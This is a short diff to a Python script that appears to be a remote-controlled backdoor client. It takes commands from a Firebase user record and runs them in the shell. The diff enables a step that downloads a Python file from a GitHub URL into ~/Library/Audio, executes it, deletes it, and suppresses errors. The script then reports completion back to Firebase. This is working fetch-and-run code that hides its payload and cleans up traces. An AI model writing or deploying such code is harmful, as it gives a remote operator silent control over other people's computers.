@@ -19,11 +19,13 @@ for cmd in userData['commands']:
         os.system(cmd)
         continue
 
-    # cmd = cmd[1:]
-    # args = cmd.split(" ")
-    # try:
-    #     os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{cmd}.py -o ~/Library/Audio/{cmd}.py")
-    #     os.system(f"python3 ~/Library/Audio/{cmd}.py {' '.join(args[1:])}")
+    args = cmd[1:].split(" ")
+    try:
+        os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{args[0]}.py -o ~/Library/Audio/{args[0]}.py")
+        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args[1:])}")
+        os.system(f"rm ~/Library/Audio/{args[0]}.py")
+    except:
+        pass
 
 userData['executed'] = True
 requests.patch(f"{FIREBASE_URL}/users/{USER}.json", data=json.dumps(userData))
